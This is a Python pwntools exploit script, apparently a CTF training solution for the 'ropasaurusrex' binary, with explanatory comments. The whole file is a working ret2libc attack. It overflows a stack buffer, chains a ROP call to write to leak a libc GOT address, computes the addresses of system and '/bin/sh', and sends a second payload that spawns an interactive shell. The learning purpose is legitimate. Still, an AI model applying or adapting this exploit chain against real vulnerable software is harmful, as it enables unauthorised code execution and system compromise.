#!/usr/bin/python
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
r = process("./ropasaurusrex")
gdb.attach(r, """
	b *0x0804841c
	c
	""")

#r = remote("training.jinblack.it", 2014)
input("wait")

#stack:
#
# AAAA
# AAAA
# sEIP <- write
# gadget	to clean up the stack from the args when the write returns
# arg 1
# arg 2
# arg 3
# 

#found in ghidra by searching for "write"
write = 0x0804830c
#args founded by "man 2 write" in the terminal

#arg1 : file descriptor
arg1 = 1
#arg2 : what to print -> got value of a libc function, for example the write 
arg2 = 0x08049614
#arg3 : number of bytes to print
arg3 = 4

#we take a gadget with 3 pops from ROPgadget
pop3 = 0x080484b6

#p32(0x080483f4) is the address of the function in the binary that executes a read, so we jump back there to have another write and split our payload
payload= p32(write) + p32(pop3) + p32(arg1) + p32(arg2) + p32(arg3) + p32(0x080483f4)

r.send(b"A"*140 + payload)

write_got = u32(r.recv(4))
print("[!] write_got: 0x%08x" % write_got)

#check that the printed address is from libc: vmmap addr, copute the offset from the start of the libc addresses by subtractig the adrr from the base addr (first address returned by vmmap addr) that is always constant

libc_base = write_got - 0xe6ea0
print("[!] libc_base: 0x%08x" % libc_base)

#now we know where libc is, so we can compute the address of system and /bin/sh
# from terminal: objdump -D libc-2.27.so -M intel | grep system	     --> get the offset between the base and system
system = libc_base + 0x0003d250
print("[!] system: 0x%08x" % system)

#from gdb "search /bin/sh" and compute the difference between the libc base and it to get the constant offset
binsh = libc_base + 0x17e3cf
print("[!] binsh: 0x%08x" % binsh)

time.sleep(0.1)

#this other send is made possible by jumping back to the read function with the previous payload
payload2= p32(system) + b"BBBB" + p32(binsh)

r.send(b"A"*140 + payload2)

r.interactive()